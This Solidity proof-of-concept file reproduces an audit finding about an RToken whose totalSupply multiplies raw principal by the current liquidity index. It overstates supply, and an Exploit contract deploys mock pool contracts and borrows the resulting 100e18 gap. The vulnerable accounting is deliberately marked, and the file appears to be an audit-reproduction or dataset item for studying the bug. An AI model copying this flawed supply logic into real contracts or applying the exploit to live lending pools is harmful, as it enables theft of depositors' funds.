// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Regnum Aurum — H-17 (Pashov, 2025-05-06), AuditVault 66358
    RToken.totalSupply rayMuls the raw principal supply by the current
    liquidity index. Alice entered at 1.0 and Bob at 2.0. Fair claims are
    300e18. totalSupply reports 400e18. A borrower takes the 100e18 gap.
*/

interface IERC20 {
    function totalSupply() external view returns (uint256);
}

interface ILendingPool {
    function getNormalizedIncome() external view returns (uint256);
}

library WadRayMath {
    uint256 internal constant RAY = 1e27;
    uint256 internal constant HALF = RAY / 2;

    function rayMul(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a * b + HALF) / RAY;
    }
}

contract Asset {
    string public symbol = "AST";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LendingPool is ILendingPool {
    uint256 public income = 1e27;

    function getNormalizedIncome() external view returns (uint256) {
        return income;
    }

    function setIncome(uint256 income_) external {
        income = income_;
    }
}

contract ERC20 {
    uint256 internal _rawSupply;
    mapping(address => uint256) public rawBalance;

    function totalSupply() public view virtual returns (uint256) {
        return _rawSupply;
    }

    function _mint(address to, uint256 amount) internal {
        rawBalance[to] += amount;
        _rawSupply += amount;
    }
}

contract RToken is ERC20, IERC20 {
    using WadRayMath for uint256;

    ILendingPool internal immutable _lendingPool;
    mapping(address => uint256) public userIndex;
    address public alice;
    address public bob;

    constructor(ILendingPool pool) {
        _lendingPool = pool;
    }

    function totalSupply() public view override(ERC20, IERC20) returns (uint256) {
        return super.totalSupply().rayMul(ILendingPool(_lendingPool).getNormalizedIncome()); // @> VULN: raw principal supply is scaled by the current index
    }

    function mintPrincipal(address to, uint256 amount, uint256 index) external {
        _mint(to, amount);
        userIndex[to] = index;
        if (alice == address(0)) alice = to;
        else bob = to;
    }

    function fairClaims() public view returns (uint256) {
        uint256 index = _lendingPool.getNormalizedIncome();
        return rawBalance[alice] * index / userIndex[alice] + rawBalance[bob] * index / userIndex[bob];
    }
}

contract LendingPoolBorrow {
    Asset public asset;
    RToken public rToken;

    constructor(Asset asset_, RToken rToken_) {
        asset = asset_;
        rToken = rToken_;
    }

    function borrowInflated() external {
        uint256 reported = rToken.totalSupply(); // STORY: read supply
        uint256 fair = rToken.fairClaims();
        uint256 extra = reported - fair; // STORY: gap
        asset.transfer(msg.sender, extra);
    }
}

contract Exploit {
    uint256 public constant AUDIT_ID = 66358;
    Asset public asset;
    LendingPool public pool;
    RToken public rToken;
    LendingPoolBorrow public book;
    uint256 public taken;

    constructor() {
        asset = new Asset();
        pool = new LendingPool();
        rToken = new RToken(pool);
        book = new LendingPoolBorrow(asset, rToken);
        asset.mint(address(book), 300e18);
    }

    function run() external {
        rToken.mintPrincipal(address(0xA11CE), 100e18, 1e27); // STORY: alice
        rToken.mintPrincipal(address(0xB0B), 100e18, 2e27); // STORY: bob
        pool.setIncome(2e27); // STORY: index
        book.borrowInflated();
        taken = asset.balanceOf(address(this));
        require(rToken.totalSupply() == 400e18, "supply");
        require(rToken.fairClaims() == 300e18, "fair");
        require(taken == 100e18, "taken"); // STORY: harm
        require(asset.balanceOf(address(book)) == 200e18, "left");
    }
}
